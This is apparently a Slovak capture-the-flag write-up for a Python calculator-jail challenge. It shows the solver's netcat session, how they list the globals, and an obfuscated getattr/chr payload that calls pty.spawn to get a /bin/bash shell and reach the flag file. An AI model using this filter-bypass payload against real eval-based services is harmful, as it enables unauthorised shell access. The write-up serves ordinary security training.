Úloha 1

EN: You have found an exposed calculator program. It doesn’t seem to do anything useful beyond simple arithmetic operations. The source code is also available on GitHub. 
Can you make this application more useful? Python version is 3.12.3
Service: exp.cybergame.sk:7002

SK: Našli ste verejne prístupný kalkulačný program. Zdá sa, že nevykonáva nič užitočné okrem jednoduchých aritmetických operácií. Zdrojový kód je tiež dostupný na GitHub-e.
Môžete spraviť túto aplikáciu užitočnejšou? Python verzia je 3.12.3
Služba: exp.cybergame.sk:7002


Riešenie:
Pripojil som sa cez netcat na service, následne som si nechal vypísať zoznam všetkých atribútov objektu typu dict

─$ nc exp.cybergame.sk 7002                                                                                                         
>> dir(globals())
['__class__', '__class_getitem__', '__contains__', '__delattr__', '__delitem__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__ior__', '__iter__', '__le__', '__len__', '__lt__', '__ne__', '__new__', '__or__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__ror__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'clear', 'copy', 'fromkeys', 'get', 'items', 'keys', 'pop', 'popitem', 'setdefault', 'update', 'values']

Následne som si nechal vypísať aj mená globálnych premenných                                                                                                       
>> list(globals().keys())
['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__annotations__', '__builtins__', '__file__', '__cached__', 'socket', 'os', 'pty', 'sys', 'handle_client', 'main']

Pochopil som, že cieľom úlohy je spustiť nejakým spôsobom bin/bash a zároveň potrebujeme obíst všetky nepovolené znaky a slová, tým pádom som sa zameral na obfuscáciu.
Tento príkaz použije getattr() na získanie funkcie spawn zo pty modulu a následne použije túto funkciu na spustenie príkazu /bin/bash.
getattr(pty, chr(115) + chr(112) + chr(97) + chr(119) + chr(110))(chr(47) + chr(98) + chr(105) + chr(110) + chr(47) + chr(98) + chr(97) + chr(115) + chr(104))

Podarilo sa...
calc@c0c5de003a3a:~$ /run/docker/bin/ls
flag.txt  main.py
